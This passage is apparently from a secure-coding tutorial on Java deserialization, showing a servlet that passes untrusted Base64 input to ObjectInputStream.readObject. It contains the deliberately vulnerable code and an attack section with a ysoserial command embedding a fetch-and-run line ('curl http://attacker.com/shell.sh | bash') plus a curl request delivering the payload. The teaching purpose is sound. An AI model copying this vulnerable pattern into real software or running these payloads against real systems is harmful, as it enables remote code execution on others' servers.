Using ObjectInputStream directly on untrusted data is extremely dangerous and has led to some of the most devastating security vulnerabilities in Java history, including attacks on major enterprise systems.

**VULNERABLE CODE**:

```java
import java.io.*;
import java.util.Base64;
import javax.servlet.http.*;

public class VulnerableSessionHandler extends HttpServlet {

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        // DANGEROUS: Deserializing untrusted user input
        String sessionData = request.getParameter("session");

        if (sessionData != null) {
            byte[] decodedBytes = Base64.getDecoder().decode(sessionData);
            ByteArrayInputStream bis = new ByteArrayInputStream(decodedBytes);

            // CRITICAL VULNERABILITY: Arbitrary object deserialization
            ObjectInputStream ois = new ObjectInputStream(bis);
            try {
                Object userSession = ois.readObject();  // RCE here!
                processSession(userSession);
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
            }
        }
    }

    private void processSession(Object session) {
        // Process the deserialized session
        System.out.println("Session loaded: " + session);
    }
}
```

**Attack Payload** (using ysoserial tool):
```bash
# Generate malicious serialized object using ysoserial
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/shell.sh | bash' | base64 -w0

# Send to vulnerable endpoint
curl -X POST 'http://target.com/session' \
  -d "session=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTa...[malicious payload]"
```

**Why This Is Dangerous**:
- Java deserialization triggers code execution in object constructors and magic methods (readObject, readResolve)
- Gadget chains in common libraries (Commons Collections, Spring, etc.) allow arbitrary code execution
- No validation occurs before the malicious code executes
- Attack complexity is LOW with tools like ysoserial generating payloads automatically

